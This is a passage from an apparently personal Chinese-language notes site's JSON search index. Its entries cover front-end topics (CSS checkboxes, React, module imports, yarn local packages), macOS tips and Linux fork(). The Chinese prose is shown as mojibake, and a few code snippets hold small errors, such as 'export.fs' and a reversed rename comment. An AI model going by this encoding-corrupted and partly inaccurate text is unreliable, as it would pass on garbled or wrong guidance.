left: 50%; top: 50%; border-color: whitesmoke; border-style: solid; border-width: 0 ; transform: translate(-50%, -90%) rotate(-40deg); } /* <i> æ ‡ç­¾çš„æ ·å¼ æ­¤å¤„æ˜¯å®è“è‰²èƒŒæ™¯, æ¥ç®¡inputçš„ç‚¹å‡»è¡Œä¸º, é•¿å®½è®¾ç½®ä¸º16 */ .custom-checkbox-0 > i { background-color: royalblue; display: inline-block; vertical-align: text-bottom; position: relative; pointer-events: all; width: 16px; height: 16px; cursor: pointer; border: 1px solid; border-radius: 50%; /* è®¾ç½®åœ†å½¢ */ } /* <i> æ ‡ç­¾é€‰ä¸­æ—¶çš„å¤–è§‚ å³æ‰“å‹¾ (å®ç°åŸç†æ˜¯åªæ˜¾ç¤ºå·¦è¾¹å’Œå³è¾¹çš„è¾¹æ¡†ç„¶åæ—‹è½¬, çœ‹èµ·æ¥å°±æ˜¯ä¸ªå‹¾äº†) */ .custom-checkbox-0 > input:checked + i:before { width: 8px; height: 4px; border-width: 0 0 1px 1px; } /*.custom-checkbox-0 > input[disabled]:checked + i:before{*/ /* width: 0;*/ /* height: 0;*/ /* border-width: 0;*/ /*}*/ æ³¨è§£ å¥½åƒå¾ˆå¤šä¸œè¥¿çš„é»˜è®¤æ ·å¼éƒ½ä¸æ˜¯å¾ˆå¥½æ”¹, å¾—å€ŸåŠ©å…¶ä»–å…ƒç´  ä¸”çº¯ç”¨cssæ¥æ›´æ”¹å¾ˆéš¾","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Checkbox-of-custom-style.html","loc":"/yq-doc-source-docs-front-end-question-Checkbox-of-custom-style.html"},{"title":"electron+react+ts","text":"å‚è€ƒ: https://www.cnblogs.com/bleaka/p/16184636.html","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Electron+React+TS.html","loc":"/yq-doc-source-docs-front-end-question-Electron+React+TS.html"},{"title":"å‰ç«¯-å‡½æ•°è°ƒç”¨ä¸ç»„ä»¶è°ƒç”¨","text":"å‡½æ•°è°ƒç”¨ä¸ç»„ä»¶è°ƒç”¨çš„åŒºåˆ« å‡è®¾æœ‰ä¸€ä¸ªå‡½æ•°ç»„ä»¶: const Selector = () => { return (<div></div>) } è¿™ä¸ªæ—¶å€™å‡½æ•°è°ƒç”¨: Selector() ä¸ç»„ä»¶è°ƒç”¨: <Selector/> åŸºæœ¬ä¸Šæ˜¯ä¸€è‡´çš„. ä½†æ˜¯, å¦‚æœå‡½æ•°ç»„ä»¶åŒ…å«äº†reactçŠ¶æ€: const Selector = () => { const [ready, setReady] = useState(true) return (<div></div>) } ä¸”å¦‚æœæ˜¯åœ¨ç±»ä¸­è°ƒç”¨, é‚£ä¹ˆåªèƒ½ç”¨: <Selector/> è²Œä¼¼æ˜¯å› ä¸ºç›´æ¥ Selector() ç›¸å½“äºåµŒå…¥è¿™ä¸ªå‡½æ•°, è€Œç±»ä¸­ä¸èƒ½ä½¿ç”¨çŠ¶æ€. æ³¨è§£ å½“ä½œç»„ä»¶ä½¿ç”¨æ—¶, ç»„ä»¶åé¦–å­—æ¯å¿…é¡»å¤§å†™. å°å†™çš„ä¼šå½“ä½œhtmlç»„ä»¶, ä¸è¯†åˆ«","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Front-end-function-call-and-component-call.html","loc":"/yq-doc-source-docs-front-end-question-Front-end-function-call-and-component-call.html"},{"title":"importä¸require","text":"importä¸require æ˜¯å‰ç«¯å¯¼åŒ…ä½¿ç”¨çš„æ–¹å¼, éµå¾ªä¸¤ç§ä¸åŒçš„è§„èŒƒ import - import/export æ˜¯ES6å¼•å…¥çš„æ–°è§„èŒƒï¼Œå› ä¸ºæµè§ˆå™¨å¼•æ“å…¼å®¹é—®é¢˜ï¼Œéœ€è¦åœ¨nodeä¸­ç”¨babelå°†ES6è¯­æ³•ç¼–è¯‘æˆES5è¯­æ³• - import æ˜¯ç¼–è¯‘æ—¶è°ƒç”¨ï¼Œæ‰€ä»¥å¿…é¡»æ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ - import æ˜¯è§£æ„è¿‡ç¨‹ã€‚ä½¿ç”¨importå¯¼å…¥æ¨¡å—çš„å±æ€§æˆ–è€…æ–¹æ³•æ˜¯å¼•ç”¨ä¼ é€’ã€‚ä¸”importæ˜¯read-onlyçš„ï¼Œå€¼æ˜¯å•å‘ä¼ é€’çš„ã€‚defaultæ˜¯ES6 æ¨¡å—åŒ–æ‰€ç‹¬æœ‰çš„å…³é”®å­—ï¼Œexport default {} è¾“å‡ºé»˜è®¤çš„æ¥å£å¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰å‘½åï¼Œåˆ™åœ¨importæ—¶å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªåç§°ç”¨æ¥å…³è”è¿™ä¸ªå¯¹è±¡ require - require/exports æ˜¯ CommonJS/AMD ä¸­ä¸ºäº†è§£å†³æ¨¡å—åŒ–è¯­æ³•è€Œå¼•å…¥çš„ - require æ˜¯è¿è¡Œæ—¶è°ƒç”¨ï¼Œæ‰€ä»¥ç†è®ºä¸Šå¯ä»¥è¿ä½œåœ¨ä»£ç çš„ä»»ä½•åœ°æ–¹ - require æ˜¯èµ‹å€¼è¿‡ç¨‹ï¼Œå…¶å®requireçš„ç»“æœå°±æ˜¯å¯¹è±¡ã€æ•°å­—ã€å­—ç¬¦ä¸²ã€å‡½æ•°ç­‰ï¼Œå†æŠŠç»“æœèµ‹å€¼ç»™æŸä¸ªå˜é‡ã€‚å®ƒæ˜¯æ™®é€šçš„å€¼æ‹·è´ä¼ é€’ã€‚ - é€šè¿‡requireå¼•å…¥åŸºç¡€æ•°æ®ç±»å‹æ—¶,å±äºå¤åˆ¶è¯¥å˜é‡ - é€šè¿‡requireå¼•å…¥å¤æ‚æ•°æ®ç±»å‹æ—¶, å±äºæµ…æ‹·è´è¯¥å¯¹è±¡ - å‡ºç°æ¨¡å—ä¹‹é—´å¾ªç¯å¼•ç”¨æ—¶, ä¼šè¾“å‡ºå·²æ‰§è¡Œçš„æ¨¡å—, æœªæ‰§è¡Œæ¨¡å—ä¸ä¼šè¾“å‡º - CommonJSè§„èŒƒé»˜è®¤exportçš„æ˜¯ä¸€ä¸ªå¯¹è±¡,å³ä½¿å¯¼å‡ºçš„æ˜¯åŸºç¡€æ•°æ®ç±»å‹ å†™æ³• require/exports æ–¹å¼çš„å†™æ³•æ¯”è¾ƒç»Ÿä¸€: // exports export.fs = fs module.exports = fs // require const module = require('module') import/export æ–¹å¼çš„å†™æ³•å°±ç›¸å¯¹ä¸°å¯Œäº›: // export export default fs; export const fs; export function part; export { part1, part2 }; export * from 'fs'; // import import fs from 'fs'; import { newFs as fs } from 'fs'; // ES6è¯­æ³•, å°†fsé‡å‘½åä¸ºnewFs, å‘½åå†²çªæ—¶å¸¸ç”¨ import { part } from fs; import fs, { part } from fs;","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Import-and-Require.html","loc":"/yq-doc-source-docs-front-end-question-Import-and-Require.html"},{"title":"ObjectåŸå‹æ–¹æ³•","text":"å¯¹è±¡æ‹·è´-Object.assign() Object.assign() æµ…æ‹·è´å¯¹è±¡å±æ€§, è¿”å›æ–°çš„å¯¹è±¡ å¦‚æœéœ€è¦æ·±æ‹·è´, å¯ä»¥: JSON.parse(JSON.stringify(obj))","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Object-prototype-method.html","loc":"/yq-doc-source-docs-front-end-question-Object-prototype-method.html"},{"title":"package.jsonå¢åŠ æœ¬åœ°æ¨¡å—","text":"æ–¹æ¡ˆä¸€: ç›´æ¥æ·»åŠ æœ¬åœ°è·¯å¾„ å¦‚æœä¸ä»‹æ„ä¸ä½¿ç”¨è¯­æ„åŒ–ç‰ˆæœ¬, å¯ä»¥ç›´æ¥: yarn add link:./src/@ide/right-context-menu -W æˆ–è€…: yarn add file:./src/@ide/right-context-menu -W ä¸¤ä¸ªæ•ˆæœåŸºæœ¬ä¸€è‡´, -W å¼ºåˆ¶æŒ‡å®šç»™æ ¹çš„package.jsonæ·»åŠ , æ•ˆæœå¤§æ¦‚å¦‚ä¸‹: \"dependencies\": { \"@ide/right-context-menu\": \"link:./src/@ide/right-context-menu\" } æˆ–è€…: \"dependencies\": { \"@ide/right-context-menu\": \"file:./src/@ide/right-context-menu\" } æ–¹æ¡ˆäºŒ: ä½¿ç”¨è¯­æ„åŒ–ç‰ˆæœ¬(è¿™ä¸ªä¸è¡Œ, çœ‹ä¸‹ä¸€ä¸ª) ä½†æ˜¯å¦‚æœæƒ³ä½¿ç”¨è¯­æ„åŒ–ç‰ˆæœ¬, å¦‚: \"dependencies\": { \"@ide/right-context-menu\": \"0.1.0\" } éœ€è¦å…ˆåœ¨ package.json å¢åŠ ä¸Šè¿°è¯­æ„åŒ–ç‰ˆæœ¬é…ç½®, ç„¶åå†é“¾æ¥: yarn add link:./src/@ide/right-context-menu -W æ–¹æ¡ˆä¸‰: ä½¿ç”¨è¯­æ„åŒ–ç‰ˆæœ¬çš„å¦ä¸€ç§æ–¹å¼(é—®çš„AI) å¦‚æœè¦é€šè¿‡ yarn æ¥å®‰è£…æœ¬åœ°æ¨¡å—å¹¶ç”Ÿæˆè¯­ä¹‰åŒ–ç‰ˆæœ¬,å¯ä»¥è¿™æ ·æ“ä½œ: åœ¨æœ¬åœ°æ¨¡å—ä¸­å®šä¹‰ç‰ˆæœ¬å·,ä¾‹å¦‚åœ¨ package.json ä¸­è®¾ç½® \"version\": \"1.0.0\" åœ¨ä¸»é¡¹ç›®ä¸­,ä½¿ç”¨ yarn link æ¥é“¾æ¥æœ¬åœ°æ¨¡å—: å…ˆæ³¨å†Œæœ¬åœ°æ¨¡å—, åœ¨æœ¬åœ°æ¨¡å—ä¸­æ‰§è¡Œ: cd æœ¬åœ°æ¨¡å—æ‰€åœ¨è·¯å¾„ yarn link ç„¶åè¿”å›é¡¹ç›®æ ¹ç›®å½•, åœ¨ä¸»é¡¹ç›®ä¸­æ‰§è¡Œ: yarn link æ¨¡å—å è¿™æ—¶å¯ä»¥åœ¨ä¸»é¡¹ç›®ä¸­ç›´æ¥å¼•ç”¨å’Œä½¿ç”¨æœ¬åœ°æ¨¡å—äº† é€šè¿‡ yarn add ä¿å­˜ä¾èµ–æ—¶,ä¼šè‡ªåŠ¨è¯»å–åˆ°æœ¬åœ°æ¨¡å—çš„ç‰ˆæœ¬å·, å¹¶å†™å…¥ä¸»é¡¹ç›®çš„ package.json: yarn add æ¨¡å—å package.json ä¸­å°†ä¼šæ˜¾ç¤º: \"dependencies\": { \"æ¨¡å—å\": \"1.0.0\" } æ³¨è§£ æœ‰æ—¶å€™ä¼šæœ‰é—®é¢˜, addçš„æ—¶å€™è¿˜æ˜¯ä»ä»“åº“å»æ‰¾, è€Œä¸æ˜¯ç›´æ¥ç”¨æœ¬åœ°çš„... æ‰€ä»¥è¿™æ—¶å€™è¿˜æ˜¯å¾—æ‰‹åŠ¨åŠ åˆ°package.jsoné‡Œé¢å»... ä¸è®°å¾—ä¹‹å‰æ˜¯ä¸æ˜¯æœ‰æ‰‹åŠ¨åŠ äº†... è¿™æ ·å°±å¯ä»¥é€šè¿‡ yarn å®ç°åœ¨ä¸»é¡¹ç›®ä¸­ä»¥è¯­ä¹‰åŒ–ç‰ˆæœ¬çš„æ–¹å¼å®‰è£…å’Œä¾èµ–æœ¬åœ°æ¨¡å—ã€‚ ä¸»è¦åˆ©ç”¨äº† yarn link æ¥å…³è”æœ¬åœ°æ¨¡å—,å¹¶é€šè¿‡ yarn add æ¥å†™å…¥æ­£ç¡®çš„ä¾èµ–ç‰ˆæœ¬å·ã€‚ åŒæ—¶è¦æ³¨æ„,æœ¬åœ°æ¨¡å—çš„ä»£ç æ”¹åŠ¨è¿˜ä¼šç›´æ¥å½±å“åˆ°ä¸»é¡¹ç›®,è¦æ§åˆ¶ç‰ˆæœ¬å¹¶å‘å¸ƒ,è¿˜éœ€è¦é‡‡å–é¢å¤–çš„æªæ–½ã€‚ ï¼ˆå·²ç¼–è¾‘ï¼‰ æœ¬åœ°æ¨¡å—çš„ç¼–è¯‘ é»˜è®¤æƒ…å†µä¸‹, yarn/npmåªä¼šå¤„ç†ä¸»é¡¹ç›®çš„æ„å»ºç­‰ æ¯”å¦‚æœ¬åœ°æ¨¡å—å¦‚æœæ˜¯ts, æœ€ç¬¨çš„åŠæ³•å°±æ˜¯ç›´æ¥å»æ¨¡å—ç›®å½•æ‰‹åŠ¨æ‰§è¡Œ tsc æœ‰ä¸€ä¸ªå« lerna çš„æ¨¡å—, å¯ä»¥é€’å½’ç¼–è¯‘, ä»è€Œè¾¾åˆ°ç¼–è¯‘æ‰€æœ‰æœ¬åœ°æ¨¡å—çš„æ•ˆæœ, ä½¿ç”¨: lerna init lerna run build ç¼–è¯‘æŠ¥é”™-node_modelçš„æŠ¥é”™ å¦‚æœæ„å»ºçš„æ—¶å€™, å‘ç°ç¼–è¯‘çš„ç¡®å®æ˜¯æœ¬åœ°æ¨¡å—, ä½†æ˜¯å› ä¸ºå¯¼åŒ…, ä»è€Œå‡ºç°äº† node_modules ä¸‹é¢æ¨¡å—çš„æ£€æŸ¥æŠ¥é”™, å¯ä»¥åœ¨ tsconfig.json é…ç½®(æ ¹é¡¹ç›®): { \"compilerOptions\": { \"skipLibCheck\": true } } æˆ–è€…é…ç½® learn.json \"command\": { \"build\": { \"typescript\": { \"tsConfigOverride\": { \"skipLibCheck\": true } } } } ä¹Ÿå¯ä»¥ç›´æ¥å‘½ä»¤è¡Œ: tsc --skipLibCheck æ³¨è§£ æƒ³ä¸é€šçš„ä¸€ç‚¹æ˜¯ tsc æ²¡æœ‰æŠ¥é”™, ä½†æ˜¯learnè§¦å‘çš„æœ‰è¿™ä¸ªæŠ¥é”™; ç¼–è¯‘é—®é¢˜-ä¼šåœ¨æ ¹ç›®å½•æ‹·è´ä¸€ä»½æºç åˆ°é…ç½®çš„outDir è§£å†³: å»é™¤æ ¹ tscofig.json çš„ä»¥ä¸‹å†…å®¹: \"compilerOptions\": { \"rootDir\": \"src\", \"outDir\": \"lib\", } \"include\": [ \"src\" ], æ³¨é‡Šæ‰å³å¯","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Package.json-adds-local-modules.html","loc":"/yq-doc-source-docs-front-end-question-Package.json-adds-local-modules.html"},{"title":"vscodeé¡¹ç›®çš„ç¼–è¯‘è¿è¡Œ","text":"å…‹éš†é¡¹ç›®: git clone https://github.com/microsoft/vscode.git é¡¹ç›®æ ¹ç›®å½•ä¸‹è½½æ’ä»¶, nodeæ¨¡å—: yarn ç¼–è¯‘: yarn run compile è¿è¡Œ: bash scripts/code.sh çœ‹äº†ç½‘ä¸Šå‡ å¹´å‰çš„å¸–å­è¯´è°ƒè¯•éœ€è¦ yarn run watch æ¥debug, ä½†æ˜¯ä¹‹è¦watchäº†, å°±è·‘ä¸äº†code.sh, åé¢å‘ç°, watchè¦ç­‰åˆ°è·‘å®Œæ‰è¡Œ, è·‘åˆ°: Finished compilation extensions xxx æ›´æ–° cloneåä¸‹é¢é»˜è®¤æœ‰ä¸€ä¸ª .vscode/launch.json , å¯ä»¥ä½¿ç”¨vscodeæ¥å®Œç¾çš„æ–­ç‚¹è°ƒè¯•(é»˜è®¤ç¬¬ä¸€ä¸ªå°±æ˜¯) webstorm è¯•äº†åŠå¤©æ²¡ææ‡‚æ€ä¹ˆè°ƒæ–­ç‚¹. å‚è€ƒäº† .vscode/launch.json , å¤§è‡´çœ‹äº†ä¸€ä¸‹, æœ‰äº›æ­¥éª¤æ²¡ææ‡‚.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-The-compilation-and-operation-of-the-vSCode-project.html","loc":"/yq-doc-source-docs-front-end-question-The-compilation-and-operation-of-the-vSCode-project.html"},{"title":"htmlä¸‹urlç¼–ç ","text":"å‚è€ƒ:: HTML URL ç¼–ç å‚è€ƒæ‰‹å†Œ URL ç¼–ç ï¼ˆç™¾åˆ†æ¯”ç¼–ç ï¼‰ URL ç¼–ç å°†å­—ç¬¦è½¬æ¢ä¸ºå¯é€šè¿‡å› ç‰¹ç½‘ä¼ è¾“çš„æ ¼å¼ã€‚ URL åªèƒ½ä½¿ç”¨ ASCII å­—ç¬¦é›† é€šè¿‡å› ç‰¹ç½‘è¿›è¡Œå‘é€ã€‚ ç”±äº URL é€šå¸¸åŒ…å« ASCII é›†ä¹‹å¤–çš„å­—ç¬¦ï¼Œå› æ­¤å¿…é¡»å°† URL è½¬æ¢ä¸ºæœ‰æ•ˆçš„ ASCII æ ¼å¼ã€‚ URL ç¼–ç ä½¿ç”¨åè·Ÿåå…­è¿›åˆ¶æ•°å­—çš„ \"%\" æ›¿ä»£ä¸å®‰å…¨çš„ ASCII å­—ç¬¦ã€‚ URL ä¸èƒ½åŒ…å«ç©ºæ ¼ã€‚URL ç¼–ç é€šå¸¸ä½¿ç”¨åŠ å·ï¼ˆ+ï¼‰æˆ– %20 æ›¿ä»£ç©ºæ ¼ã€‚ ASCII ç¼–ç å‚è€ƒ å­—ç¬¦ ç¼–ç åçš„ç»“æœ 'space'(ç©ºæ ¼) %20","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-URL-encoding-under-html.html","loc":"/yq-doc-source-docs-front-end-question-URL-encoding-under-html.html"},{"title":"é—®é¢˜æ€»ç»“","text":"é€šè¿‡å˜é‡ç”Ÿæˆæ­£åˆ™ å¦‚æœæ˜¯ç¡®å®šå­—ç¬¦çš„æ­£åˆ™: /\\.txt$/g è¡¨ç¤ºåŒ¹é…æ‰€æœ‰ä»¥ .txt ç»“å°¾ ä½†æ˜¯ä¸æ”¯æŒç›´æ¥æ‹¼æ¥å˜é‡, æ¯”å¦‚æƒ³åŒ¹é…çš„å¯èƒ½ä»¥å…¶ä»–æŒ‡å®šå­—ç¬¦ä¸²ç»“å°¾, å°±åªæœ‰é€šè¿‡æ˜¾ç¤ºçš„ç¤ºä¾‹: const regStr = '.txt' new RegExp(regStr + '$', 'g') ä¸ä¸Šæ•ˆæœä¸€è‡´. åˆ¤æ–­æ˜¯å¦æ˜¯æ•°ç»„ ä½¿ç”¨ Array å†…ç½®æ–¹æ³•: Array.isArray(obj) åˆ¤æ–­æ˜¯å¦æ˜¯ç»å¯¹è·¯å¾„ ä½¿ç”¨æ­£åˆ™åŒ¹é… æ˜¯å¦æ˜¯æ–œæ å¼€å¤´ æˆ–è€… æ˜¯å¦æ˜¯å­—æ¯+å†’å·+åŒåæ–œæ  å¼€å¤´: /&#94;(\\/|[a-z]:\\\\)/i.test(target) testæ˜¯JSæ­£åˆ™è‡ªå¸¦å‡½æ•°, è¿”å›å€¼ä¸º boolean JSè®¾ç½®é¢„å®šä¹‰å˜é‡ æœ‰æ—¶å€™, å¦‚æœåœ¨CSSå®šä¹‰äº†å˜é‡æ¯”å¦‚èƒŒæ™¯è‰², ä½†å¯èƒ½è¿™ä¸ªé¢œè‰²æ˜¯åŠ¨æ€åŠ è½½çš„, å¯¼è‡´åˆå§‹åŒ–çš„æ—¶å€™è¿™ä¸ªé¢œè‰²å°± ä¼šæ²¡æœ‰å®šä¹‰, è¿™ä¸ªæ—¶å€™å¯ä»¥åœ¨æœ€åˆçš„é¡µé¢, JSåŠ¨æ€è®¾ç½®ä¸€ä¸ªé¢œè‰²: document.documentElement.style.setProperty('--body-bg', '#1E1E1E') ä¸Šæ¬¡çš„é¢œè‰²å¯ä»¥æå‰æ”¾åœ¨localStorage: window.localStorage.setItem('bg-color', '#1E1E1E') é€»è¾‘è¿ç®—ç¬¦??ä¸||åŒºåˆ« ?? è¿ç®—ç¬¦(ç©ºå€¼åˆå¹¶è¿ç®—ç¬¦ï¼ˆNullish Coalescing Operatorï¼‰) åªä¼šåœ¨å·¦æ“ä½œæ•°ä¸º null æˆ– undefined æ—¶è¿”å›å³æ“ä½œæ•°ä½œä¸ºé»˜è®¤å€¼ ã€‚ å¯¹äºå…¶ä»– falsy å€¼ï¼ˆå¦‚ falseã€0ã€ç©ºå­—ç¬¦ä¸²ç­‰ï¼‰ï¼Œ?? è¿ç®—ç¬¦ä¸ä¼šè§¦å‘æä¾›é»˜è®¤å€¼çš„è¡Œä¸º || è¿ç®—ç¬¦åœ¨ å·¦æ“ä½œæ•°ä¸ºä»»ä½• falsy å€¼æ—¶éƒ½ä¼šè¿”å›å³æ“ä½œæ•° ä½œä¸ºé»˜è®¤å€¼ ä¾‹: > 0 || 4 4 > 0 ?? 4 0","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-conclusion-of-issue.html","loc":"/yq-doc-source-docs-front-end-question-conclusion-of-issue.html"},{"title":"macä¸€ç›´å¼¹ç™»å½•é¡¹","text":"æ¸…ç©ºç™»å½•é¡¹: sfltool resetbtm æˆ–è€…æ”¹æƒé™: 555 sfltool dumpbtm: æ‰“å°ç™»å½•é¡¹å’Œåå°é¡¹çš„å½“å‰çŠ¶æ€ï¼ŒåŒ…æ‹¬è½½å…¥çš„ servicemanagement æœ‰æ•ˆè´Ÿè½½ UUIDã€‚ sfltool resetbtmï¼šè¿˜åŸç™»å½•é¡¹å’Œåå°é¡¹æ•°æ®ã€‚å¦‚æœåœ¨æµ‹è¯•é—´ä½¿ç”¨æ­¤å‘½ä»¤ï¼Œå»ºè®®ç”¨æˆ·ä¹Ÿé‡æ–°å¯åŠ¨è‡ªå·±çš„ç”µè„‘ã€‚ è§: åœ¨ Mac ä¸Šç®¡ç†ç™»å½•é¡¹å’Œåå°ä»»åŠ¡","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-question-MAC-has-been-playing-login-items.html","loc":"/yq-doc-source-docs-operating-system-Mac-question-MAC-has-been-playing-login-items.html"},{"title":"MacAppææƒ","text":"è§ MacOS Appä»£ç ç”³è¯·ç®¡ç†å‘˜æƒé™ AuthorizationExecuteWithPrivileges ä½¿ç”¨ServiceManagement.frameworkæ³¨å†ŒLaunchdDaemon AppleScript: do shell script \"...\" with administrator privileges","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-question-MacAPP-right.html","loc":"/yq-doc-source-docs-operating-system-Mac-question-MacAPP-right.html"},{"title":"Mac-Xcode å¤šç‰ˆæœ¬","text":"githubä¸Šæœ‰ç°æˆçš„é¡¹ç›®æ–¹ä¾¿åˆ‡æ¢, åœ°å€: https://github.com/XcodesOrg/XcodesApp/tags ä½¿ç”¨: éœ€è¦å…ˆæ‰‹åŠ¨ç™»é™†Apple ID æ³¨è§£ éœ€è¦å¯¹åº”ç‰ˆæœ¬çš„command line å…¶ä»–æ–¹å¼ æ‰‹åŠ¨å‘½ä»¤è¡Œæ“ä½œ, å‚è€ƒåœ°å€: https://juejin.cn/post/7251792725070217275 æŸ¥çœ‹å½“å‰ç‰ˆæœ¬æŒ‡ä»¤: # æˆ–è€… xcode-select -p gcc --version åˆ‡æ¢ç‰ˆæœ¬æŒ‡ä»¤: sudo xcode-select --switch <xcode_folder_path> ä¸Šè¿°å¤±è´¥, ç°åœ¨ç‰ˆæœ¬æ˜¯Mac OS14.1, èƒ½ä¸‹è½½ä¸èƒ½æ‰“å¼€, ä½œç½¢","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-question-Xcode-multi--version.html","loc":"/yq-doc-source-docs-operating-system-Mac-question-Xcode-multi--version.html"},{"title":"é—®é¢˜æ€»ç»“","text":"Appçª—å£å¼¹å‡ºåœ¨æœ€ä¸Šå±‚ è¿™ä¸ªåˆ†ä¸¤ç§æƒ…å†µ, ä¸€ä¸ªæ˜¯æ™®é€šApp, ä¸€ä¸ªæ˜¯ç³»ç»Ÿçº§App å¯¹äºæ™®é€šAppçš„View å•ç‹¬Viewçš„æ˜¾ç¤ºéœ€è¦å…ˆè®²å…¶è½¬æ¢ä¸ºNsWindowç„¶åé…ç½®æ˜¾ç¤º: import SwiftUI extension TipView{ // MARK: - Interface func showViewOnNewWindowInSpecificTime(during timer: CGFloat) -> NSWindow { let alertWindow = self.setWindow() displayAsAlert(win: alertWindow, Timer: timer) return alertWindow } // MARK: - Attribute private func displayAsAlert(win:NSWindow, Timer:Double) { // åœ¨å½“å‰çª—å£ä¸Šæ˜¾ç¤º win.level = .floating win.isMovableByWindowBackground = false win.titleVisibility = .hidden win.titlebarAppearsTransparent = true win.isOpaque = false win.styleMask.remove(.closable) win.styleMask.remove(.fullScreen) win.styleMask.remove(.miniaturizable) win.styleMask.remove(.fullSizeContentView) win.styleMask.remove(.resizable) win.backgroundColor = NSColor.clear win.orderFrontRegardless() DispatchQueue.main.asyncAfter(deadline: .now() + Timer) { win.close() } } private func setWindow() -> NSWindow { NSWindow(contentViewController: NSHostingController(rootView: self)) } } ä¸»è¦æ˜¯ win.level = .floating , è®¾ç½®ä¸ºæµ®åŠ¨çª—å£ ä½†æ˜¯è‹¥æƒ³å¼¹å‡ºåœ¨å…¶ä»–å…¨å±Appä¸Šå°±ä¸è¡Œäº†. ç³»ç»Ÿçº§App è¿™é‡Œçš„ ç³»ç»Ÿçº§App æŒ‡çš„æ˜¯è®¾ç½®äº† Application is agent (UIElement) ä¸º YES çš„APP, æ­¤é…ç½®ä½œç”¨è¯¦è§ /docs/åç«¯/swift/Xcodeçš„Infoé…ç½® è®¾ç½®åé»˜è®¤å°±æ˜¯ç³»ç»Ÿçº§çš„App, ä¸éœ€è¦å†åƒæ™®é€šAppé‚£æ ·è®¾ç½®æµ®åŠ¨çª—å£, é»˜è®¤å¯ä»¥æ˜¾ç¤ºåœ¨å…¶ä»–å…¨å±Appä¸Š æŸ¥çœ‹å›ºæ€å¯¿å‘½ ä¹Ÿæ”¯æŒç”µæ± å¾ªç¯æ•°å•¥çš„, ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/smartctl æŒ‡ä»¤: smartctl -a /dev/disk0","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-question-conclusion-of-issue.html","loc":"/yq-doc-source-docs-operating-system-Mac-question-conclusion-of-issue.html"},{"title":"fork","text":"è¿›ç¨‹0æ˜¯ç³»ç»Ÿå¼•å¯¼æ—¶åˆ›å»ºçš„ä¸€ä¸ªç‰¹æ®Šè¿›ç¨‹ï¼Œ åœ¨å…¶è°ƒç”¨forkåˆ›å»ºå‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼ˆå³pid=1ï¼Œåˆç§°initï¼‰åï¼Œ è¿›ç¨‹0å°±å˜æˆäº†äº¤æ¢è¿›ç¨‹ï¼ˆæœ‰æ—¶ä¹Ÿè¢«ç§°ä¸ºç©ºé—²è¿›ç¨‹ï¼‰ï¼Œè€Œè¿›ç¨‹1ï¼ˆinitï¼‰å°±æ˜¯å…¶ä»–è¿›ç¨‹çš„ç¥–å…ˆ linuxé™¤äº†pid=0çš„è¿›ç¨‹éƒ½æ˜¯å…¶ä»–è¿›ç¨‹ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨forkå‡½æ•°åˆ›å»ºçš„ fork() å‡½æ•°çš„ä¸»è¦ä½œç”¨æ˜¯åœ¨çˆ¶è¿›ç¨‹è°ƒç”¨çš„åŸºç¡€ä¸Šåˆ›å»ºä¸€ä¸ªå…¶çš„å­è¿›ç¨‹ã€‚ fork() å‡½æ•°æœ‰ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯åªè°ƒç”¨ä¸€æ¬¡å´ä¼šè¿”å›ä¸¤æ¬¡ï¼Œ ä¸€æ¬¡æ˜¯çˆ¶è¿›ç¨‹è¿”å›çš„å€¼ ä¸€ä¸ªå¤§äº0çš„æ•° ï¼ˆå³ä»–åˆ›å»ºçš„å­è¿›ç¨‹çš„PIDï¼ŒPID æ˜¯æ“ä½œç³»ç»Ÿä¸­è¿›ç¨‹çš„å”¯ä¸€æ ‡è¯† ï¼‰ è€Œå¦å¤–ä¸€æ¬¡åˆ™æ˜¯å­è¿›ç¨‹è¿”å›çš„å€¼ ä¸º0ã€‚ è¿˜æœ‰ä¸€ç§æƒ…å†µå°±æ˜¯çˆ¶è¿›ç¨‹è°ƒç”¨è¯¥å‡½æ•°çš„æ—¶å€™å¦‚æœè¿”å›çš„ <0 çš„æ•°åˆ™è¯´æ˜åˆ›å»ºè¿›ç¨‹å¤±è´¥ï¼ˆå¤±è´¥çš„åŸå› æœ‰å¾ˆå¤šï¼‰ã€‚ å¦å¤–ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„æ˜¯è°ƒç”¨ fork() å‡½æ•° çš„æ—¶å€™ å­è¿›ç¨‹æ˜¯æ¥ç€è¯¥è°ƒç”¨åçš„ä»£ç ç»§ç»­æ‰§è¡Œçš„ï¼Œ å¦‚æœå…¶åè¿˜å­˜åœ¨è°ƒç”¨fork() å‡½æ•° å­è¿›ç¨‹ä¹Ÿå¯ä»¥ä½œä¸ºçˆ¶è¿›ç¨‹åˆ›å»ºå®ƒçš„å­è¿›ç¨‹ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-fork.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-fork.html"},{"title":"æ–‡ä»¶ç³»ç»Ÿè¯¦è§£","text":"æ–‡ä»¶ç³»ç»Ÿçš„åŸºæœ¬ç»„æˆ 